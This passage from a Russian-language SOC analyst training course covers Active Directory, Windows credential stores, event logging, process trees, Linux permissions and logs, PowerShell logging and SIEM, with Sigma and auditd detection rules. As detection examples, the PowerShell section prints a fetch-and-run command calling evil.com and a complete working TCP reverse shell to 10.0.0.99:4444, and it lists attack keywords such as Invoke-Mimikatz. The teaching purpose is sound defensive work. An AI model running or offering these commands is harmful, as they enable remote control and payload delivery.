Active Directory — это «телефонная книга» организации, но с правами доступа. В ней записано: кто работает в компании, к каким ресурсам у кого есть доступ, какие правила действуют. LDAP — это «язык запросов» к этой книге. Когда вы входите в Windows на рабочей станции, ваш компьютер спрашивает AD: «Этот человек — настоящий сотрудник? К чему у него есть доступ?»

### Как это работает

**Структура Active Directory:**

```
┌─────────────────────────────────────────┐
│           Лес (Forest)                   │
│  ┌─────────────────────────────────┐    │
│  │      Домен (corp.local)         │    │
│  │  ┌──────────────────────────┐   │    │
│  │  │  OU = Москва             │   │    │
│  │  │  ├── OU = IT             │   │    │
│  │  │  │   ├── user: admin01   │   │    │
│  │  │  │   ├── user: sysadmin  │   │    │
│  │  │  │   └── comp: SRV-DC01  │   │    │
│  │  │  ├── OU = Бухгалтерия    │   │    │
│  │  │  │   ├── user: ivanova   │   │    │
│  │  │  │   └── comp: PC-BUH01  │   │    │
│  │  │  └── OU = Серверы        │   │    │
│  │  │      ├── comp: SQL-01    │   │    │
│  │  │      └── comp: FILE-01   │   │    │
│  │  └──────────────────────────┘   │    │
│  │                                 │    │
│  │  Группы:                        │    │
│  │  ├── Domain Admins              │    │
│  │  ├── Enterprise Admins          │    │
│  │  ├── Schema Admins              │    │
│  │  └── Backup Operators           │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
```

**LDAP (Lightweight Directory Access Protocol)** — протокол для чтения и записи данных в AD. Порты: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog).

**DN (Distinguished Name):** Уникальный путь к объекту:
```
CN=admin01,OU=IT,OU=Москва,DC=corp,DC=local
```

**Что атакующий ищет через LDAP:**

| Запрос | Цель | Детекция |
|--------|------|---------|
| Все пользователи Domain Admins | Найти привилегированные аккаунты | Event 4662 с Read Property |
| Аккаунты с SPN | Подготовка к Kerberoasting | Event 4662 + последующий 4769 |
| Аккаунты без preauth | AS-REP Roasting | LDAP query для userAccountControl |
| Доверительные отношения (trusts) | Распространение на другие домены | Event 4662 для Trusted Domain objects |
| GPO с паролями (cpassword) | Старые GPP-пароли в SYSVOL | Файловый доступ к SYSVOL |
| Computer accounts | Карта сети | Массовые LDAP-запросы |

**GPO (Group Policy Objects):** Централизованные политики для управления настройками. Для SOC важно:
- GPO может устанавливать software — вектор persistence
- GPO может менять firewall rules — вектор уклонения
- GPO может устанавливать scheduled tasks — вектор выполнения

**BloodHound** — инструмент аудита AD, который строит граф атак. Показывает кратчайший путь от рядового пользователя до Domain Admin. SOC/Blue team использует его для проактивного нахождения слабых мест.

### Что видит SOC-аналитик

**Подозрительная LDAP-разведка (массовые запросы):**
```
Event ID 4662: An operation was performed on an object
  Subject: CORP\compromised_user
  Object Type: domainDNS
  Properties: Read all properties
  Access Mask: 0x10  (ReadProperty)
```

**Sigma-правило для обнаружения LDAP-разведки:**
```yaml
title: Массовые LDAP-запросы (AD Enumeration)
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        AccessMask: '0x100'  # Control Access
    timeframe: 5m
    condition: selection | count(ObjectName) by SubjectUserName > 50
level: medium
```

### Типичные ошибки

1. **«AD безопасен по умолчанию»** — AD по умолчанию позволяет любому аутентифицированному пользователю читать почти все объекты. Это «design feature», не баг.
2. **«Достаточно защитить Domain Admins»** — Есть множество путей эскалации через другие группы (Backup Operators, Account Operators, GPO Creator Owners).
3. **«BloodHound — инструмент хакеров»** — BloodHound — мощнейший инструмент Blue Team для аудита AD. Если вы не нашли слабые пути — атакующий найдёт.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **AD** | Active Directory — служба каталогов Microsoft |
| **LDAP** | Lightweight Directory Access Protocol — протокол доступа к AD |
| **DN** | Distinguished Name — уникальный путь к объекту в AD |
| **OU** | Organizational Unit — организационная единица (папка) |
| **GPO** | Group Policy Object — политика для управления настройками |
| **Trust** | Доверительное отношение между доменами |
| **BloodHound** | Инструмент визуализации путей атак в AD |
| **SYSVOL** | Общая папка на DC с GPO и скриптами |

## Тема 9: Как Windows хранит учётные данные

### Зачем это знать защитнику

Кража учётных данных — ключевой этап 90% атак на Windows-инфраструктуру. SOC-аналитик должен знать, где хранятся пароли и хеши, чтобы понимать, что защищать и как обнаружить попытки их извлечения.

### Простое объяснение (аналогия)

Представьте сейф (SAM), в котором хранятся ключи от всех дверей (пароли). Рядом стоит охранник (LSASS), который держит в руках копии ключей для быстрого доступа. А в подвале — главный архив (NTDS.dit), где хранятся ключи от всех дверей всей организации. Атакующий может попытаться: вскрыть сейф (SAM dump), обыскать охранника (LSASS dump), или скопировать архив (NTDS.dit extraction).

### Как это работает

```
Локальный компьютер:
┌─────────────────────────────────┐
│  SAM (Security Account Manager) │
│  C:\Windows\System32\config\SAM │
│  Содержит: NTLM хеши локальных │
│  учётных записей                │
│  Зашифрован: SYSKEY             │
└─────────────────────────────────┘

┌─────────────────────────────────┐
│  LSASS (Local Security          │
│  Authority Subsystem Service)    │
│  Процесс: lsass.exe             │
│  Содержит в памяти:             │
│  - NTLM хеши                    │
│  - Kerberos TGT и сеансовые     │
│    ключи                         │
│  - Пароли в открытом виде       │
│    (WDigest, если включён)       │
│  - PIN-коды                      │
└─────────────────────────────────┘

┌─────────────────────────────────┐
│  LSA Secrets                     │
│  Реестр: HKLM\SECURITY\Policy   │
│  Содержит:                       │
│  - Пароли сервисных аккаунтов    │
│  - Кешированные доменные         │
│    учётные данные (DCC2)         │
│  - Автологон пароли              │
└─────────────────────────────────┘

Домен-контроллер:
┌─────────────────────────────────┐
│  NTDS.dit                        │
│  C:\Windows\NTDS\ntds.dit       │
│  Содержит:                       │
│  - NTLM хеши ВСЕХ доменных      │
│    пользователей                  │
│  - Kerberos ключи                │
│  - История паролей               │
│  Зашифрован: Boot Key             │
└─────────────────────────────────┘
```

**Методы защиты:**

| Механизм | Что защищает | Как работает |
|----------|-------------|-------------|
| **Credential Guard** | LSASS | Изолирует LSASS в виртуальной машине (VBS). Даже с правами SYSTEM нельзя извлечь хеши |
| **RunAsPPL** | LSASS | Protected Process Light — запрещает чтение памяти LSASS неподписанными процессами |
| **LAPS** | Локальные admin-пароли | Уникальный пароль local admin на каждом хосте, хранится в AD |
| **Disable WDigest** | Пароли в памяти | Отключает хранение паролей в открытом виде в LSASS |
| **Protected Users** | Доменные аккаунты | Группа AD: запрещает NTLM, кеширование, delegation |

### Что видит SOC-аналитик

**Sysmon Event ID 10 — доступ к процессу LSASS:**
```
EventID: 10 (ProcessAccess)
SourceImage: C:\Users\attacker\mimikatz.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010  (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION)
```

**Sigma-правило для обнаружения доступа к LSASS:**
```yaml
title: Подозрительный доступ к LSASS
logsource:
    product: windows
    category: process_access
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1038'
            - '0x1FFFFF'
    filter:
        SourceImage|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Program Files\Windows Defender\'
    condition: selection and not filter
level: critical
```

### Типичные ошибки

1. **«NTLM хеш = пароль»** — Хеш — не пароль, но его достаточно для Pass-the-Hash атаки (аутентификация без знания пароля).
2. **«Credential Guard решает всё»** — Credential Guard защищает только от извлечения хешей. Он не защищает от Kerberoasting или фишинга.
3. **«Если пароль сложный, хеш не взломают»** — NTLM не использует salt. Одинаковые пароли = одинаковые хеши. Rainbow tables работают.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **SAM** | Security Account Manager — БД локальных аккаунтов |
| **LSASS** | Local Security Authority Subsystem Service — процесс аутентификации |
| **NTDS.dit** | База данных Active Directory на DC |
| **NTLM хеш** | MD4 хеш пароля Windows (без salt!) |
| **Credential Guard** | Виртуализированная изоляция учётных данных |
| **RunAsPPL** | Protected Process Light для LSASS |
| **LAPS** | Local Administrator Password Solution |
| **DCC2** | Domain Cached Credentials v2 — кешированные доменные хеши |

## Тема 10: Windows Event Logging

### Зачем это знать защитнику

Windows Event Logs — основной источник данных для SOC-аналитика в Windows-среде. Каждый вход, каждый запуск процесса, каждое изменение привилегий записывается в журналы. Без умения читать и фильтровать эти логи невозможно обнаружить ни одну атаку.

### Простое объяснение (аналогия)

Представьте систему камер наблюдения в здании. Windows Event Logging — это набор камер, записывающих всё: кто вошёл, кто что открыл, кто включил компьютер. Но камеры нужно правильно настроить (Audit Policy), иначе они записывают только то, как люди входят, но не то, что они делают внутри.

### Как это работает

**Архитектура:**

```
                     Приложения / Ядро
                           │
                    ┌──────┴──────┐
                    │    ETW      │  Event Tracing for Windows
                    │  (шина     │  (единая шина телеметрии)
                    │  событий)  │
                    └──────┬──────┘
                           │
              ┌────────────┼────────────┐
              ▼            ▼            ▼
         ┌─────────┐ ┌─────────┐ ┌─────────┐
         │Security │ │ System  │ │Sysmon   │
         │.evtx    │ │.evtx    │ │(опц.)   │
         └─────────┘ └─────────┘ └─────────┘
              │            │            │
              └────────────┼────────────┘
                           │
                    ┌──────┴──────┐
                    │  WEF / SIEM │  Windows Event Forwarding
                    │  (сбор)     │  или агент SIEM
                    └─────────────┘
```

**Основные журналы:**

| Журнал | Путь | Что записывает |
|--------|------|---------------|
| **Security** | Security.evtx | Входы, выходы, доступ к объектам, изменения привилегий |
| **System** | System.evtx | Запуск/остановка сервисов, ошибки драйверов |
| **Application** | Application.evtx | Ошибки приложений, установка ПО |
| **PowerShell** | Microsoft-Windows-PowerShell/Operational | Выполнение команд PS (если включено логирование) |
| **Sysmon** | Microsoft-Windows-Sysmon/Operational | Процессы, сеть, файлы, реестр (нужен Sysmon) |
| **WMI** | Microsoft-Windows-WMI-Activity/Operational | WMI-подписки (persistence) |
| **TaskScheduler** | Microsoft-Windows-TaskScheduler/Operational | Создание/изменение задач |

**Топ Event IDs для SOC-аналитика:**

| Event ID | Источник | Описание | Зачем мониторить |
|---------|---------|---------|----------------|
| **4624** | Security | Successful Logon | Logon Type 3=сеть, 10=RDP |
| **4625** | Security | Failed Logon | Brute-force detection |
| **4648** | Security | Explicit Credentials | RunAs / Pass-the-Hash |
| **4672** | Security | Special Privileges | Admin logon |
| **4688** | Security | Process Creation | Запуск подозрительных процессов |
| **4698** | Security | Scheduled Task Created | Persistence detection |
| **4720** | Security | User Created | Новый аккаунт = подозрительно |
| **4732** | Security | User Added to Group | Эскалация привилегий |
| **1102** | Security | Audit Log Cleared | Антифорензика! |
| **7045** | System | Service Installed | Persistence / lateral movement |
| **4104** | PowerShell | Script Block Logging | Все PS-команды |

**Logon Types (Event 4624):**

| Type | Описание | Для SOC |
|------|---------|--------|
| 2 | Interactive (консоль) | Физический вход |
| 3 | Network (SMB, RPC) | Lateral movement! |
| 4 | Batch (scheduled task) | Persistence |
| 5 | Service | Сервис запущен |
| 7 | Unlock | Разблокировка |
| 10 | RemoteInteractive (RDP) | Удалённый вход |
| 11 | CachedInteractive | Вход с кешированными учётными данными |

### Что видит SOC-аналитик

**Event 4625 (Failed Logon) — brute-force:**
```xml
<Event>
  <System>
    <EventID>4625</EventID>
    <TimeCreated SystemTime="2026-11-12T10:15:23Z" />
  </System>
  <EventData>
    <Data Name="TargetUserName">admin</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="IpAddress">192.168.1.100</Data>
    <Data Name="FailureReason">%%2313</Data>  <!-- Unknown user or bad password -->
  </EventData>
</Event>
```

**Event 1102 (Log Cleared) — антифорензика:**
```
Событие критическое: кто-то очистил Security Log!
Subject: CORP\compromised_admin
```

### Типичные ошибки

1. **«По умолчанию Windows логирует всё»** — Нет! По умолчанию многие категории аудита отключены. Нужно настроить Advanced Audit Policy.
2. **«Sysmon заменяет Event Log»** — Sysmon ДОПОЛНЯЕТ Event Log. Security Log и Sysmon дают разную информацию.
3. **«Все логи хранятся локально»** — Да, и атакующий может их удалить. Нужен WEF или SIEM-агент для отправки логов на центральный сервер.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **ETW** | Event Tracing for Windows — подсистема трассировки |
| **EVTX** | Формат файлов Windows Event Log |
| **WEF** | Windows Event Forwarding — централизованный сбор логов |
| **Audit Policy** | Настройка категорий логирования |
| **Logon Type** | Тип входа в систему (2=консоль, 3=сеть, 10=RDP) |
| **Sysmon** | Sysinternals System Monitor — расширенное логирование |

## Тема 11: Процессы в Windows

### Зачем это знать защитнику

Анализ дерева процессов — один из главных методов обнаружения малвари и подозрительной активности. Каждый процесс в Windows имеет родителя, и нормальные parent-child связи хорошо известны. Аномалия в дереве процессов — часто первый признак компрометации.

### Простое объяснение (аналогия)

Процессы в Windows — как семейное дерево. У каждого процесса есть «родитель», который его запустил. Нормальная семья: smss.exe → csrss.exe, winlogon.exe → explorer.exe → chrome.exe. Если вдруг cmd.exe запущен из winword.exe — это как если бы ваш текстовый редактор начал выполнять системные команды. Красный флаг!

### Как это работает

**Нормальное дерево процессов Windows:**

```
System (PID 4)
├── smss.exe (Session Manager)
│   ├── csrss.exe (Client/Server Runtime, Session 0)
│   ├── wininit.exe
│   │   ├── services.exe
│   │   │   ├── svchost.exe (множество экземпляров)
│   │   │   ├── spoolsv.exe
│   │   │   ├── lsass.exe      ← КРИТИЧНЫЙ ПРОЦЕСС
│   │   │   └── MsMpEng.exe (Windows Defender)
│   │   └── lsaiso.exe (Credential Guard)
│   ├── csrss.exe (Session 1)
│   └── winlogon.exe
│       └── dwm.exe (Desktop Window Manager)
│
└── [User Session]
    explorer.exe
    ├── chrome.exe
    ├── outlook.exe
    ├── notepad.exe
    └── cmd.exe (если запущена пользователем)
```

**Красные флаги в дереве процессов:**

| Аномалия | Что это может быть | Пример |
|----------|-------------------|--------|
| `svchost.exe` без родителя `services.exe` | Малварь маскируется | svchost.exe из temp-папки |
| `cmd.exe` / `powershell.exe` из `winword.exe` | Exploit через документ | Macro → cmd.exe |
| `lsass.exe` не из `wininit.exe` | Поддельный lsass | Второй lsass.exe |
| Процесс из `C:\Users\...\AppData` | Малварь в профиле | evil.exe из Downloads |
| `rundll32.exe` без аргументов | Injection / malware | Пустой rundll32 |
| `explorer.exe` с родителем не winlogon | Injection | explorer.exe из cmd |

**Integrity Levels (уровни целостности):**

```
┌──────────────────────────┐
│  System (SYSTEM аккаунт) │  Максимальные привилегии
├──────────────────────────┤
│  High (Администратор,    │  После UAC elevation
│  Run as Admin)           │
├──────────────────────────┤
│  Medium (обычный         │  Стандартный пользователь
│  пользователь)           │
├──────────────────────────┤
│  Low (IE Protected Mode, │  Ограниченный доступ
│  sandbox)                │
├──────────────────────────┤
│  Untrusted               │  Минимальный доступ
└──────────────────────────┘
```

**Tokens (маркеры доступа):** Каждый процесс имеет token, определяющий его привилегии. Атакующий может украсть token привилегированного процесса (token impersonation) для эскалации.

### Что видит SOC-аналитик

**Sysmon Event ID 1 (Process Creation):**
```
EventID: 1
Image: C:\Windows\System32\cmd.exe
ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE
CommandLine: cmd.exe /c whoami
User: CORP\user01
IntegrityLevel: Medium
```

**Sigma-правило для подозрительного родителя:**
```yaml
title: Подозрительный дочерний процесс Microsoft Office
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
            - '\mshta.exe'
    condition: selection_parent and selection_child
level: high
```

### Типичные ошибки

1. **«Если процесс подписан Microsoft — он безопасен»** — LOLBins (Living Off the Land Binaries) — это легитимные подписанные утилиты Windows, используемые атакующими (certutil, mshta, regsvr32).
2. **«Один svchost.exe — это нормально»** — В нормальной Windows работает 10-20+ экземпляров svchost.exe. Один — подозрительно.
3. **«PID постоянен»** — PID назначается при создании процесса и может быть повторно использован после завершения. Для точной идентификации нужен PID + время создания.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **PEB** | Process Environment Block — структура с информацией о процессе |
| **Token** | Маркер доступа — определяет привилегии процесса |
| **Integrity Level** | Уровень целостности (Low/Medium/High/System) |
| **Parent-Child** | Отношение «родитель-потомок» между процессами |
| **LOLBins** | Living Off the Land Binaries — легитимные утилиты для атак |
| **Process Hollowing** | Запуск малвари внутри легитимного процесса |

## Тема 12: Linux файловая система и права

### Зачем это знать защитнику

Linux-серверы составляют большинство серверной инфраструктуры. Неправильные права доступа — один из основных векторов эскалации привилегий в Linux. SOC-аналитик должен уметь проверять права файлов, находить SUID-бинарники и точки persistence.

### Простое объяснение (аналогия)

Файловая система Linux — как многоэтажное здание с кабинетами. Каждый кабинет (файл) имеет замок с тремя уровнями: ключ владельца (owner), ключ отдела (group), и гостевой пропуск (others). Для каждого уровня определено: можно ли войти (r — читать), переставить мебель (w — писать), и включить оборудование (x — выполнить). SUID — это особый ключ: когда вы входите в кабинет, вы временно получаете права владельца кабинета.

### Как это работает

**Система прав (permissions):**

```
-rwxr-xr-- 1 root admin 4096 Nov 12 10:00 script.sh
│├──┤├──┤├──┤ │ │     │     │
│ │   │   │   │ │     │     └── Размер
│ │   │   │   │ │     └── Группа
│ │   │   │   │ └── Владелец
│ │   │   │   └── Ссылки
│ │   │   └── Others: r-- (только чтение)
│ │   └── Group:  r-x (чтение + выполнение)
│ └── Owner: rwx (чтение + запись + выполнение)
└── Тип: - файл, d директория, l ссылка
```

**Специальные биты:**

| Бит | Числовое | Описание | Опасность |
|----|---------|---------|----------|
| **SUID** | 4000 | Запуск от имени владельца файла | Если владелец root — эскалация привилегий! |
| **SGID** | 2000 | Запуск от имени группы файла | Менее опасен, но используется |
| **Sticky** | 1000 | Удалять файл может только владелец | Защита /tmp |

**Важные директории для SOC:**

```
/etc/              ← Конфигурации (passwd, shadow, sudoers, crontab)
/var/log/          ← Логи
/tmp/, /dev/shm/   ← Часто используется малварью (доступно на запись)
/proc/             ← Виртуальная ФС: информация о процессах
/home/*/           ← Профили пользователей (.bashrc — persistence!)
/usr/local/bin/    ← Пользовательские бинарники
```

**Точки persistence в Linux:**

| Механизм | Путь | Детекция |
|---------|------|---------|
| Crontab | /etc/crontab, /var/spool/cron/ | Мониторинг изменений |
| Systemd | /etc/systemd/system/*.service | auditd на /etc/systemd |
| rc.local | /etc/rc.local | Мониторинг изменений |
| .bashrc/.profile | /home/*/.bashrc | auditd на домашние каталоги |
| SSH authorized_keys | ~/.ssh/authorized_keys | Мониторинг изменений |
| LD_PRELOAD | /etc/ld.so.preload | Мониторинг файла |
| Kernel module | /lib/modules/ | auditd + модуль integrity |

### Что видит SOC-аналитик

**Поиск SUID-бинарников (аудит):**
```bash
find / -perm -4000 -type f 2>/dev/null
```
Нормальные SUID: /usr/bin/passwd, /usr/bin/sudo, /usr/bin/ping.
Подозрительные SUID: /tmp/ncat, /home/user/shell, /usr/bin/python3.

**auditd правило для мониторинга /etc/passwd:**
```
-w /etc/passwd -p wa -k identity_file_change
-w /etc/shadow -p wa -k identity_file_change
-w /etc/sudoers -p wa -k priv_escalation
```

### Типичные ошибки

1. **«Chmod 777 решает проблему с доступом»** — Chmod 777 = все могут всё. Это огромная дыра в безопасности.
2. **«Root может всё, остальные — ничего»** — Linux capabilities позволяют давать отдельные привилегии без полного root.
3. **«Если файл в /tmp, он безопасен»** — /tmp доступен на запись всем. Малварь часто хранится и запускается из /tmp.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **inode** | Структура данных ФС, хранящая метаданные файла |
| **SUID** | Set User ID — выполнение от имени владельца |
| **SGID** | Set Group ID — выполнение от имени группы |
| **capabilities** | Гранулярные привилегии вместо полного root |
| **auditd** | Linux Audit Daemon — мониторинг файловой активности |
| **umask** | Маска прав по умолчанию для новых файлов |

## Тема 13: Системные логи Linux

### Зачем это знать защитнику

Логи — единственный источник истины при расследовании инцидента на Linux-сервере. Без правильно настроенного логирования и централизованного сбора невозможно обнаружить компрометацию и провести расследование.

### Простое объяснение (аналогия)

Системные логи — это бортовой самописец (чёрный ящик) сервера. Он записывает всё: кто входил, что запускалось, какие ошибки возникали. Как и в авиации, если самописец сломан (логи не настроены) или уничтожен (логи стёрты), расследовать инцидент почти невозможно.

### Как это работает

**Архитектура логирования:**

```
┌─────────────┐   ┌─────────────┐   ┌─────────────┐
│ Приложения  │   │   Ядро      │   │  Systemd    │
│ (nginx,ssh) │   │ (kernel)    │   │  сервисы    │
└──────┬──────┘   └──────┬──────┘   └──────┬──────┘
       │                 │                  │
       ▼                 ▼                  ▼
┌──────────────────────────────────────────────────┐
│              systemd-journald                     │
│         (бинарный журнал, /run/log/journal)      │
│                                                   │
│  → Переадресация в rsyslog (если настроен)       │
└──────────────┬───────────────────────────────────┘
               │
               ▼
┌──────────────────────────────┐
│         rsyslog              │
│  /var/log/syslog             │
│  /var/log/auth.log           │
│  /var/log/kern.log           │
│  /var/log/messages           │
└──────────────┬───────────────┘
               │
               ▼
    ┌─────────────────────┐
    │  Центральный SIEM   │  (через syslog forwarding
    │  (Wazuh / ELK)      │   или агент)
    └─────────────────────┘
```

**Основные лог-файлы:**

| Файл | Содержимое | Для SOC |
|------|-----------|---------|
| `/var/log/auth.log` | Аутентификация (SSH, sudo, PAM) | Brute-force, эскалация привилегий |
| `/var/log/syslog` | Общие системные сообщения | Ошибки, предупреждения |
| `/var/log/kern.log` | Сообщения ядра | Kernel exploit, модули |
| `/var/log/apt/` | Установка пакетов | Подозрительные установки |
| `/var/log/cron.log` | Выполнение cron-задач | Persistence через cron |
| `/var/log/lastlog` | Последние входы | Аномальные входы |
| `/var/log/wtmp` | История входов (бинарный) | `last` — кто когда входил |
| `/var/log/btmp` | Неудачные входы (бинарный) | `lastb` — brute-force |

**Facility и Severity (приоритеты syslog):**

```
Facility (источник):          Severity (важность):
0  kern    (ядро)             0  emerg   (система неработоспособна)
1  user    (пользователь)     1  alert   (требуется немедленное действие)
2  mail    (почта)            2  crit    (критическое состояние)
3  daemon  (демоны)           3  err     (ошибка)
4  auth    (аутентификация)   4  warning (предупреждение)
10 authpriv (привилег. auth)  5  notice  (нормальное, но значимое)
                              6  info    (информационное)
                              7  debug   (отладка)
```

**Централизованное логирование (критически важно):**

Если логи остаются только на сервере, атакующий может их удалить. Централизованный сбор на отдельный лог-сервер — обязательная мера.

```bash
# /etc/rsyslog.conf — отправка всех логов на центральный сервер:
*.* @@logserver.corp.local:514  # TCP
*.* @logserver.corp.local:514   # UDP
```

### Что видит SOC-аналитик

**Brute-force SSH (auth.log):**
```
Nov 12 10:15:01 srv01 sshd[12345]: Failed password for root from 198.51.100.50 port 44321 ssh2
Nov 12 10:15:02 srv01 sshd[12346]: Failed password for root from 198.51.100.50 port 44322 ssh2
Nov 12 10:15:03 srv01 sshd[12347]: Failed password for root from 198.51.100.50 port 44323 ssh2
Nov 12 10:15:10 srv01 sshd[12348]: Accepted password for root from 198.51.100.50 port 44324 ssh2
```
^ Множество неудачных попыток, затем успешный вход → аккаунт скомпрометирован!

### Типичные ошибки

1. **«journalctl показывает всё»** — journald по умолчанию хранит логи только до перезагрузки (volatile). Нужен `Storage=persistent` в `journald.conf`.
2. **«Logrotate мешает расследованию»** — Если ротация слишком агрессивна, старые логи удаляются. Настройте хранение минимум 90 дней + отправку в SIEM.
3. **«Все логи в одном файле удобнее»** — Разделение по файлам (auth, syslog, kern) упрощает анализ. Один файл = каша.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **syslog** | Стандарт логирования (протокол + формат) |
| **rsyslog** | Современная реализация syslog в Linux |
| **journald** | Бинарный журнал systemd |
| **facility** | Категория источника сообщения |
| **severity** | Уровень важности сообщения |
| **logrotate** | Ротация (архивация + удаление) старых логов |
| **wtmp/btmp** | Бинарные файлы истории входов |

## Тема 14: PowerShell для защитника

### Зачем это знать защитнику

PowerShell — одновременно самый мощный инструмент администрирования Windows и самый популярный инструмент атакующих (LOLBin из коробки). SOC-аналитик должен знать, как настроить логирование PowerShell, чтобы видеть все команды, и как отличить легитимное использование от вредоносного.

### Простое объяснение (аналогия)

PowerShell — это как швейцарский нож: в руках мастера — незаменимый инструмент, в руках злоумышленника — оружие. Проблема в том, что этот нож встроен в каждый Windows-компьютер. Задача защитника — не убрать нож (его убрать нельзя), а поставить камеру над столом, чтобы видеть, как его используют.

### Как это работает

**Виды логирования PowerShell:**

| Тип | Event ID | Что записывает | Настройка |
|-----|---------|---------------|-----------|
| **Module Logging** | 4103 | Какой модуль и команда выполнены | GPO: Module Logging = * |
| **Script Block Logging** | 4104 | Полный текст выполненного скрипта | GPO: Script Block Logging = On |
| **Transcription** | — | Полная запись сессии в файл | GPO: Transcription = On |
| **AMSI** | — | Проверка скриптов антивирусом в реальном времени | Включён по умолчанию |

**Script Block Logging (самое важное для SOC):**

Записывает ВЕСЬ код, который выполняется в PowerShell, включая:
- Раскодированные base64-строки
- Распакованные скрипты (deobfuscation)
- Команды, введённые интерактивно

```
Event ID: 4104
ScriptBlockText:
  Invoke-WebRequest -Uri "http://evil.com/payload.exe" -OutFile "C:\temp\p.exe"
  Start-Process "C:\temp\p.exe"
```

**AMSI (Antimalware Scan Interface):**

```
┌──────────────┐
│  PowerShell  │
│  (скрипт)    │
└──────┬───────┘
       │ Перед выполнением
       ▼
┌──────────────┐     ┌──────────────┐
│    AMSI      │────>│  Антивирус   │
│  (сканер)    │     │  (Defender)  │
└──────┬───────┘     └──────────────┘
       │ Разрешено / Заблокировано
       ▼
┌──────────────┐
│  Выполнение  │
│  (или блок)  │
└──────────────┘
```

**Constrained Language Mode (CLM):** Ограничивает PowerShell: запрещены .NET-вызовы, COM-объекты, небезопасные типы. Малварь не может использовать продвинутые техники. Включается через AppLocker или WDAC.

**Признаки подозрительного PowerShell (Sigma):**

```yaml
title: Подозрительное использование PowerShell
logsource:
    product: windows
    category: ps_script
detection:
    selection:
        ScriptBlockText|contains:
            - 'IEX'                    # Invoke-Expression
            - 'Invoke-Expression'
            - '-enc'                   # Encoded command
            - 'FromBase64String'       # Base64 decode
            - 'Net.WebClient'          # Download
            - 'DownloadString'         # Download
            - 'Invoke-Mimikatz'        # Credential theft
            - 'Invoke-Shellcode'       # Execution
            - 'New-Object Net.Sockets' # Reverse shell
    condition: selection
level: high
```

### Что видит SOC-аналитик

**Подозрительный Event 4104:**
```
ScriptBlockText:
  $c = New-Object Net.Sockets.TCPClient('10.0.0.99',4444)
  $s = $c.GetStream()
  [byte[]]$b = 0..65535|%{0}
  while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
    $r = (iex $d 2>&1 | Out-String)
    $s.Write([Text.Encoding]::ASCII.GetBytes($r),0,$r.Length)
  }
```
^ Это reverse shell. Подключение к 10.0.0.99:4444, приём и выполнение команд.

### Типичные ошибки

1. **«Отключить PowerShell = безопасность»** — Не работает. Атакующий обойдёт через powershell.exe -ep bypass или использует .NET напрямую. Лучше: логировать + CLM + AMSI.
2. **«-ExecutionPolicy Bypass опасен»** — ExecutionPolicy — НЕ средство безопасности. Это административный барьер. Любой скрипт может быть запущен с bypass.
3. **«Base64 в PowerShell = всегда атака»** — Нет. Многие легитимные скрипты (SCCM, DSC) используют Base64. Смотрите на содержимое после декодирования.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Script Block Logging** | Запись полного текста PS-скриптов (Event 4104) |
| **AMSI** | Antimalware Scan Interface — проверка скриптов антивирусом |
| **CLM** | Constrained Language Mode — ограниченный режим PS |
| **IEX** | Invoke-Expression — выполнение строки как кода |
| **Execution Policy** | Административная политика запуска скриптов (не security!) |
| **LOLBin** | Living Off the Land Binary — легитимная утилита для атак |

## Тема 15: Как работает SIEM

### Зачем это знать защитнику

SIEM (Security Information and Event Management) — центральный инструмент SOC. Все логи, алерты, корреляции проходят через SIEM. SOC-аналитик, не понимающий архитектуру SIEM, не сможет ни эффективно искать угрозы, ни писать правила детекции.

### Простое объяснение (аналогия)

Представьте диспетчерскую метрополитена. С каждой станции (источника логов) идут данные: камеры, датчики, турникеты. Все данные стекаются в единый центр (SIEM), где оператор видит дашборды, получает алерты и может «отмотать запись» для расследования. Без центра — каждый охранник на своей станции, никто не видит картину целиком.

### Как это работает

```
ИСТОЧНИКИ                    SIEM                         ВЫХОД
┌──────────┐         ┌─────────────────────────┐  ┌──────────────┐
│ Windows  │────┐    │  1. СБОР (Collection)   │  │  Алерты      │
│ Event Log│    │    │     Агенты, syslog,     │  │  (email,     │
├──────────┤    │    │     API, файлы          │  │   Telegram,  │
│ Linux    │    │    ├─────────────────────────┤  │   Slack)     │
│ syslog   │────┤    │  2. НОРМАЛИЗАЦИЯ        │  ├──────────────┤
├──────────┤    ├───>│     Разные форматы →    │  │  Дашборды    │
│ Firewall │    │    │     единая схема        │  │  (Kibana,    │
│ logs     │────┤    ├─────────────────────────┤  │   Grafana)   │
├──────────┤    │    │  3. ИНДЕКСАЦИЯ          │  ├──────────────┤
│ IDS/IPS  │    │    │     Полнотекстовый      │  │  Поиск       │
│(Suricata)│────┤    │     поиск, хранение     │  │  (hunting)   │
├──────────┤    │    ├─────────────────────────┤  ├──────────────┤
│ Sysmon   │────┤    │  4. КОРРЕЛЯЦИЯ          │  │  Отчёты      │
├──────────┤    │    │     Правила → алерты    │  │  (compliance)│
│ DNS logs │────┘    │     Sigma → detection   │  └──────────────┘
└──────────┘         ├─────────────────────────┤
                     │  5. ДАШБОРДЫ / АЛЕРТЫ   │
                     │     Визуализация,       │
                     │     оповещения          │
                     └─────────────────────────┘
```

**Сравнение популярных SIEM:**

| SIEM | Тип | Стоимость | Плюсы | Минусы |
|------|-----|----------|-------|--------|
| **Wazuh** | Open-source | Бесплатно | Бесплатный, FIM, compliance | Менее зрелый UI |
| **ELK Stack** | Open-source | Бесплатно | Мощный поиск, гибкость | Не SIEM «из коробки», нужна настройка |
